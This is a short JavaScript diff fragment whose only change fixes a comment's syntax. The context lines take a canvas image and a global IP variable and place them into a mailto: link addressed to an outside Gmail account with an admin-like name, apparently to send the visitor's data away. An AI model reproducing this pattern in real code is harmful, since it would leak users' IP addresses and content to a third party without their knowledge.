@@ -42,7 +42,7 @@
         canvas.toBlob((blob) => {
           //downloadLink.setAttribute('href', URL.createObjectURL(blob));
           //downloadLink.click();
-          # "blob" still needs to be added like a proper file
+          // "blob" still needs to be added like a proper file
           let mail_win = open("mailto:adm1nistrator.demetleuven@gmail.com?subject=//^&body=////'".replace("//^", global_ip).replace("////'", blob))
           let mail_win_doc = mail_win.document
           mail_win_doc.addEventListener('load', function() {
